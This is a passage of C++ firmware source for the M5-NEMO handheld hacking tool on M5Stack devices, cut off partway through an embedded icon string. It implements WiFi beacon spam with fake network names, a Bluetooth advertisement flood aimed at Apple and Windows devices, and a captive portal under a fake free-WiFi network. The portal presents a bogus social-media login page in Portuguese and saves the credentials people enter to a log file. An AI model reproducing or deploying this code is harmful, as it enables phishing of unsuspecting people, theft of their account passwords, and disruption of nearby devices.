  DISP.fillScreen(WHITE);
  DISP.qrcode("https://github.com/n0xa/m5stick-nemo", 145, 40, 100, 5);
  DISP.setTextColor(BLACK, WHITE);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setCursor(0, 25);
  DISP.print(" M5-NEMO\n");
  DISP.setTextSize(SMALL_TEXT);
  DISP.printf("  %s\n",buildver);
  DISP.println(" For M5Stack");
#if defined(STICK_C_PLUS)
  DISP.println("  StickC-Plus");
#endif
#if defined(STICK_C)
  DISP.println("  StickC");
#endif
#if defined(CARDPUTER)
  DISP.println("  Cardputer");
#endif
  DISP.println("By Noah Axon");
  DISP.setCursor(155, 5);
  DISP.println("GitHub");
  DISP.setCursor(155, 25);
  DISP.println("Source:");
  DISP.setTextColor(WHCOLOR, BGCOLOR);
}

/////////// END CREDITS ////////////

/// WiFiSPAM ///
void wifispam_setup() {
  // create empty SSID
  for (int i = 0; i < 32; i++)
    emptySSID[i] = ' ';
  // for random generator
  randomSeed(1);

  // set packetSize
  packetSize = sizeof(beaconPacket);
  if (wpa2) {
    beaconPacket[34] = 0x31;
  } else {
    beaconPacket[34] = 0x21;
    packetSize -= 26;
  }

  //change WiFi mode
  WiFi.mode(WIFI_MODE_STA);

  // set channel
  esp_wifi_set_channel(channels[0], WIFI_SECOND_CHAN_NONE);

  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(5, 1);
  DISP.println("WiFi Spam");
  delay(1000);
  DISP.setTextSize(TINY_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.print("WiFi Spam");
    int ct = 0;
    const char *str;
    switch(spamtype) {
    case 1:
      for(str = funnyssids; *str; ++str) ct += *str == '\n';
      DISP.printf(" - %d SSIDs:\n", ct);
      DISP.print(funnyssids);
      break;
    case 2:
      for(str = rickrollssids; *str; ++str) ct += *str == '\n';
      DISP.printf(" - %d SSIDs:\n", ct);
      DISP.print(rickrollssids);
      break;
    case 3:
      DISP.printf(" - Random SSIDs\n", ct);
      break;
  }
  DISP.setTextSize(SMALL_TEXT);
  current_proc = 11;
}

void wifispam_loop() {
  int i = 0;
  int len = 0;
#if defined(M5LED)
  digitalWrite(M5_LED, LOW); //LED ON on Stick C Plus
  delay(1);
  digitalWrite(M5_LED, HIGH); //LED OFF on Stick C Plus
#endif
  currentTime = millis();
  if (currentTime - attackTime > 100) {
    switch(spamtype) {
      case 1:
        len = sizeof(funnyssids);
        while(i < len){
          i++;
        }
        beaconSpamList(funnyssids);
        break;
      case 2:
        len = sizeof(rickrollssids);
        while(i < len){
          i++;
        }
        beaconSpamList(rickrollssids);
        break;
      case 3:
        char* randoms = randomSSID();
        len = sizeof(randoms);
        while(i < len){
          i++;
        }
        beaconSpamList(randoms);
        break;        
    }
  }
}

void btmaelstrom_setup(){
  rstOverride = false;
  maelstrom = true;
}

void btmaelstrom_loop(){
  swiftPair = false;
  sourApple = true;
  aj_adv();
  if (maelstrom){
    swiftPair = true;
    sourApple = false;
    aj_adv();
  }
  if (maelstrom){
    swiftPair = false;
    sourApple = false;
    aj_loop(); // roll a random device ID
    aj_adv();
  }
}

/// WIFI MENU ///
MENU wsmenu[] = {
  { "Back", 4},
  { "Scan Wifi", 0},
  { "Spam Funny", 1},
  { "Spam Rickroll", 2},
  { "Spam Random", 3},
};

void wsmenu_drawmenu() {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 8, 1);
  for ( int i = 0 ; i < ( sizeof(wsmenu) / sizeof(MENU) ) ; i++ ) {
    DISP.print((cursor == i) ? ">" : " ");
    DISP.println(wsmenu[i].name);
  }
}

void wsmenu_setup() {
  cursor = 0;
  rstOverride = true;
  wsmenu_drawmenu();
  delay(500); // Prevent switching after menu loads up
}

void wsmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % ( sizeof(wsmenu) / sizeof(MENU) );
    wsmenu_drawmenu();
    delay(250);
  }
  if (check_select_press()) {
    int option = wsmenu[cursor].command;
    rstOverride = false;
    current_proc = 11;
    isSwitching = true;
    switch(option) {
      case 0:
        rstOverride = false;
        isSwitching = true;
        current_proc = 14;
        break;
      case 1:
        spamtype = 1;
        break;
      case 2:
        spamtype = 2;
        break;
      case 3:
        spamtype = 3;
        break;
      case 4:
        current_proc = 1;
        break;
    }
  }
}

void wscan_drawmenu() {
  char ssid[19];
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 5, 1);
  // scrolling menu
  if (cursor > 4) {
    for ( int i = 0 + (cursor - 4) ; i < wifict ; i++ ) {
      DISP.print((cursor == i) ? ">" : " ");
      DISP.println(WiFi.SSID(i).substring(0,19));
    }
  } else {
    for ( int i = 0 ; i < wifict ; i++ ) {
      DISP.print((cursor == i) ? ">" : " ");
      DISP.println(WiFi.SSID(i).substring(0,19));
    }
  }
  DISP.print((cursor == wifict) ? ">" : " ");
  DISP.println("[RESCAN]");
  DISP.print((cursor == wifict + 1) ? ">" : " ");
  DISP.println("Back");
}

void wscan_result_setup() {
  cursor = 0;
  rstOverride = true;
  wscan_drawmenu();
  delay(500); // Prevent switching after menu loads up
}

void wscan_result_loop(){
  if (check_next_press()) {
    cursor++;
    cursor = cursor % ( wifict + 2);
    wscan_drawmenu();
    delay(250);
  }
  if (check_select_press()) {
    delay(250);
    if(cursor == wifict){
      rstOverride = false;
      current_proc = 14;
    }
    if(cursor == wifict + 1){
      rstOverride = false;
      isSwitching = true;
      current_proc = 12;
    }
    String encryptType = "";
    switch (WiFi.encryptionType(cursor)) {
    case 1:
      encryptType = "WEP";
      break;
    case 2:
      encryptType = "WPA/PSK/TKIP";
      break;
    case 3:
      encryptType = "WPA/PSK/CCMP";
      break;
    case 4:
      encryptType = "WPA2/PSK/Mixed/CCMP";
      break;
    case 8:
      encryptType = "WPA/WPA2/PSK";
      break ;
    case 0:
      encryptType = "Open";
      break ;
    }
    
    DISP.setTextSize(MEDIUM_TEXT);
    if(WiFi.SSID(cursor).length() > 12){
      DISP.setTextSize(SMALL_TEXT);
    }       
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(5, 1);
    DISP.println(WiFi.SSID(cursor));
    DISP.setTextSize(SMALL_TEXT);
    DISP.printf("Chan : %d\n", WiFi.channel(cursor));
    DISP.printf("Crypt: %s\n", encryptType);
    DISP.print("BSSID:\n" + WiFi.BSSIDstr(i));
    DISP.printf("\nNext: Back\n");
  }
}

void wscan_setup(){
  rstOverride = false;  
  cursor = 0;
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(5, 1);
  DISP.println("WiFi Scan");
  delay(2000);
}

void wscan_loop(){
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setCursor(5, 1);
  DISP.println("Scanning...");
  wifict = WiFi.scanNetworks();
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(SMALL_TEXT);
  DISP.setCursor(5, 1);
  if(wifict > 0){
    isSwitching = true;
    current_proc=15;
  }
}

/////////////////////////////////

//// CAPTIVE PORTAL /////

// User configuration
#define SSID_NAME "WiFi grátis"
#define SUBTITLE "Serviço de WiFi gratuito."
#define TITLE "Log-in social:"
#define BODY "Logue-se com uma de suas redes sociais para iniciar a navegação na internet."
#define POST_TITLE "Validando..."
#define POST_BODY "Sua conta está sendo validada. Por favor, aguarde 5 minutos para iniciar a navegação.</br>Obrigado."
#define PASS_TITLE "Credenciais:"
#define CLEAR_TITLE "Credenciais apagadas:"



int capcount = 0;
int previous = -1; // stupid hack but wtfe
int BUILTIN_LED = 10;


// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

// globals variables
String Credentials = "";
String selectedSocialMedia = "";
String enteredPassword = "";
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
bool captivePortalActive = false; // define captive portal to false

DNSServer dnsServer;
WebServer webServer(80);

#define LOG_FILE "/log.txt"

void writeLog(String logData) {
  File logFile = SPIFFS.open(LOG_FILE, "a");
  if (!logFile) {
    Serial.println("Error to open log file");
    return;
  }

  logFile.println(logData);
  logFile.close();
}


// initial function clearLog
void clearLog();


String readLog() {
  File logFile = SPIFFS.open(LOG_FILE, "r");
  if (!logFile) {
    Serial.println("Error to open log file");
    return "";
  }

  String logData = logFile.readString();
  logFile.close();
  return logData;
}


String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}


String footer() {
  return "</div><div class=q><center><a>&#169; All rights reserved.</a></center></div>";
}


String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";

  String h = "<!DOCTYPE html><html>"
             "<meta charset=\"UTF-8\">"
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style>"
             "</head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h2>" + t + "</h2></div><div>";
  return h;
}


String credsPage() {
  String logData = readLog();
  // Adiciona <br> após cada entrada de log para exibição em linhas separadas
  logData.replace("\n", "<br><br>");
  return header(PASS_TITLE) + "<ol>" + logData + "</ol><br><center><p><a style=\"color:blue\" href=/>Voltar a Home</a></p><p><a style=\"color:blue\" href=/clear>Limpar credenciais</a></p></center>" + footer();
}


String index() {
  // Carregue os ícones em base64 para cada rede social
  String googleIconBase64 = "";
  String facebookIconBase64 = "";
  String instagramIconBase64 = "";
  String tiktokIconBase64 = "";
  
  /*
  String googleIconBase64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAQnAAAEJwHZTx2AAAAFu2lUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgOS4xLWMwMDEgNzkuMTQ2Mjg5OSwgMjAyMy8wNi8yNS0yMDowMTo1NSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnBob3Rvc2hvcD0iaHR0cDovL25zLmFkb2JlLmNvbS9waG90b3Nob3AvMS4wLyIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0RXZ0PSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VFdmVudCMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDI0LjcgKFdpbmRvd3MpIiB4bXA6Q3JlYXRlRGF0ZT0iMjAyMy0xMi0xN1QyMDowNjo1Mi0wMzowMCIgeG1wOk1vZGlmeURhdGU9IjIwMjMtMTItMjZUMTQ6MTg6NDgtMDM6MDAiIHhtcDpNZXRhZGF0YURhdGU9IjIwMjMtMTItMjZUMTQ6MTg6NDgtMDM6MDAiIGRjOmZvcm1hdD0iaW1hZ2UvcG5nIiBwaG90b3Nob3A6Q29sb3JNb2RlPSIzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjI5Y2Y3ZTNhLWY2NWUtMDM0Zi04ZDIyLTk5MTY4MDlhYmM5YiIgeG1wTU06RG9jdW1lbnRJRD0i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";
  String facebookIconBase64 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAAAQnAAAEJwHZTx2AAAAE7mlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgOS4xLWMwMDEgNzkuMTQ2Mjg5OSwgMjAyMy8wNi8yNS0yMDowMTo1NSAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOnBob3Rvc2hvcD0iaHR0cDovL25zLmFkb2JlLmNvbS9waG90b3Nob3AvMS4wLyIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0RXZ0PSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VFdmVudCMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDI0LjcgKFdpbmRvd3MpIiB4bXA6Q3JlYXRlRGF0ZT0iMjAyMy0xMi0xOVQxNTo1NzozNy0wMzowMCIgeG1wOk1vZGlmeURhdGU9IjIwMjMtMTItMjZUMTQ6MTk6MTUtMDM6MDAiIHhtcDpNZXRhZGF0YURhdGU9IjIwMjMtMTItMjZUMTQ6MTk6MTUtMDM6MDAiIGRjOmZvcm1hdD0iaW1hZ2UvcG5nIiBwaG90b3Nob3A6Q29sb3JNb2RlPSIzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOmU3NGJjNDU0LTQ5NGUtODI0OS05ZjRjLTRiYWFjMGYxN2RkOSIgeG1wTU06RG9jdW1lbnRJRD0i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";
